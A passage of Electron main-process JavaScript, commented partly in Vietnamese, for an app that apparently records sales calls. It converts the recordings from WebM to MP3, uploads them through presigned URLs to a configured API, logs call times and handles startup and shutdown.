        const tempFilename = filename.replace('.mp3', '.webm');
        const tempFilePath = path.join(dateDir, tempFilename);
        
        const base64Data = dataUrl.split(',')[1];
        if (!base64Data) {
            const error = new Error('Invalid dataUrl: no base64 data found');
            console.error('save-file: ERROR -', error.message);
            throw error;
        }
        
        let buffer;
        try {
            buffer = Buffer.from(base64Data, 'base64');
            if (buffer.length === 0) {
                const error = new Error('Buffer is empty');
                console.error('save-file: ERROR -', error.message);
                throw error;
            }
        } catch (err) {
            console.error('save-file: ERROR - Failed to decode base64:', err.message);
            throw err;
        }

        try {
            fs.writeFileSync(tempFilePath, buffer);
            // Verify temp file
            const tempStats = fs.statSync(tempFilePath);
            if (tempStats.size === 0) {
                const error = new Error('Temporary file is empty');
                console.error('save-file: ERROR -', error.message);
                throw error;
            }
        } catch (err) {
            console.error('save-file: ERROR - Failed to write temp file:', err.message);
            throw err;
        }

        // Convert to MP3
        const mp3FilePath = path.join(dateDir, filename);
        
        try {
            await convertToMP3(tempFilePath, mp3FilePath);
        } catch (err) {
            console.error('save-file: ERROR - Conversion failed:', err.message);
            // Xóa temp file nếu conversion fail
            try {
                if (fs.existsSync(tempFilePath)) {
                    fs.unlinkSync(tempFilePath);
                }
            } catch {}
            throw err;
        }

        // Delete temporary WebM file
        try {
            fs.unlinkSync(tempFilePath);
        } catch (err) {
            console.error('save-file: ERROR - Failed to delete temp file:', err.message);
        }

        // Get MP3 file size
        try {
            const stats = fs.statSync(mp3FilePath);
            const sizeKB = (stats.size / 1024).toFixed(2);
            return { path: mp3FilePath, size: sizeKB };
        } catch (err) {
            console.error('save-file: ERROR - Failed to get file stats:', err.message);
            throw err;
        }
    } catch (error) {
        console.error('save-file: FATAL ERROR: ', error.message, error.stack);
        throw error;
    }
});

ipcMain.handle('upload-file', async (event, { timeParams, filePath }) => {
    try {
        if (!filePath || !fs.existsSync(filePath)) {
            const error = new Error('File not found: ' + filePath);
            console.error('upload-file: ERROR -', error.message);
            throw error;
        }
        const {
            beginTime,
            endTime,
        } = timeParams;
        const fileName = path.basename(filePath);
        const fileExtension = path.extname(filePath).toLowerCase();
        const contentType = contentTypeMap[fileExtension] || 'application/octet-stream';
        const response = await callApi(
            appConfig.API_UPLOAD_URL,
            appConfig.UPLOAD_API,
            'POST',
            {
                name: fileName,
                type: contentType,
            },
            { 'x-api-token': appConfig.SALE_TOKEN },
            10000,
            false
        );
        if (response.code !== 200) {
            console.error('upload-file error:', response?.message || 'Unknown error');
            return false;
        }
        const { presignUrl, url } = response.data;
        // Đọc file thành Buffer để gửi binary data
        const fileBuffer = fs.readFileSync(filePath);
        // Gửi file binary bằng callApi với presignUrl (full URL)
        await callApi(
            '', // apiUrl không cần vì endpoint là full URL
            presignUrl, // presignUrl là full URL, callApi sẽ detect và dùng trực tiếp
            'PUT',
            fileBuffer, // Binary data (Buffer)
            { 'Content-Type': contentType },
            60000, // Timeout 60s cho file lớn
            false
        );
        // call api lưu lịch sử
        const saveHistoryResponse = await callApi(
            appConfig.API_URL,
            appConfig.SAVE_HISTORY_API,
            'POST',
            {
                begin_time: new Date(beginTime).toISOString(),
                end_time: new Date(endTime).toISOString(),
                call_url: url
            },
            { 'x-api-token': appConfig.SALE_TOKEN },
            10000,
            false
        );
        if (!saveHistoryResponse?.success) {
            console.error('upload-file: Failed to save history:', saveHistoryResponse);
            return false;
        }
        // Xóa file khi API lưu lịch sử thành công
        try {
            if (fs.existsSync(filePath)) {
                fs.unlinkSync(filePath);
            }
        } catch (err) {
            console.error('upload-file: ERROR - Failed to delete file:', err.message);
        }
        return true;
    } catch (error) {
        console.error('upload-file: ERROR - Failed to upload file:', error.message);
        throw error;
    }
});

app.whenReady().then(() => {
    // Setup file watcher để tự động reload khi file được tạo/thay đổi
    // setupConfigFileWatcher();
    setTimeout(() => {
        loadConfigFiles();
    }, 5000);
    createWindow();
    startMonitoring();
    // startClipboardMonitoring();
    // Bắt đầu auto-check version sau 10 giây (để app khởi động xong)
    setTimeout(() => {
        startVersionCheck();
    }, 10000);
    // startMonitoringTest();
});

app.on('window-all-closed', () => {
    if (monitoringInterval) {
        clearInterval(monitoringInterval);
    }
    stopVersionCheck();
    stopClipboardMonitoring();
    app.quit();
});

app.on('before-quit', () => {
    if (monitoringInterval) {
        clearInterval(monitoringInterval);
    }
    stopVersionCheck();
    stopClipboardMonitoring();
    if (isRecording) {
        mainWindow.webContents.send('stop-recording');
    }
});


// for test
async function startMonitoringTest() {
    try {
        mainWindow.webContents.send('start-recording');
        setTimeout(() => {
            mainWindow.webContents.send('stop-recording');
        }, 10000);
    } catch (error) {
        console.error('Monitoring loop error:', error.message);
        console.error('Stack error:', error.stack);
    }
}
